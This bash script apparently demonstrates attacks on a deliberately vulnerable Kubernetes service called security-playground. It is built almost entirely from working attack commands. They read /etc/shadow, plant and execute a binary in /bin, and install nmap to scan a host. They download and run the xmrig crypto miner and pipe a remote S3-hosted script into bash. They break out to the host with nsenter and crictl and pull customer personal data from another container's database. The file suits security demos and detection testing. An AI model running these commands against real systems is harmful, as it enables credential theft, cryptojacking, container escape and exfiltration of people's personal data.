#!/bin/bash
# Script to demonstrate how to interact with security-playground

NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
NODE_PORT=30000

echo "1. Exploit reading our /etc/shadow file and sending it back to us"
curl $NODE_IP:$NODE_PORT/etc/shadow

echo "2. Exploit writing to /bin"
curl -X POST $NODE_IP:$NODE_PORT/bin/hello -d 'content=echo "hello-world"'
echo ""
echo "and then set it to be executable"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 /bin/hello'
echo "and then run it"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=hello'

echo "3. Exploit installing nmap and running a scan"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'

echo "4. Exploit running a script to run a crypto miner"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O xmrig.tar.gz'
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=/app/xmrig-6.18.1/xmrig --dry-run'

echo "5. Break out of our namespace to the host's with nsenter and install crictl in /usr/bin"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl https://z9k65lokhn70.s3.amazonaws.com/install-crictl.sh | bash'

echo "6. Break out of our namespace to the host's with nsenter and talk directly to the container runtime"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps'

echo "7. Exfil some data from another container running on the same Node"
POSTGRES_ID=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name postgres-sakila -q')
curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)'"